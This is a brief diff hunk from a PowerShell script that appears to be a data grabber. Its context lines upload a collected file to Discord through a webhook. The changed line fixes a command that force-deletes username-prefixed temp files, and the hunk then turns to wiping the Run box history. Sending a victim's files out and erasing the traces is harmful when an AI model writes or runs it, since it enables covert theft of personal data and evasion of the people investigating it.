@@ -126,7 +126,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
 
 # Delete contents of Temp folder 
 
-rm $env:*_xrjg.txt -r -Force -ErrorAction SilentlyContinue
+rm $env:USERNAME*_xrjg.txt -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
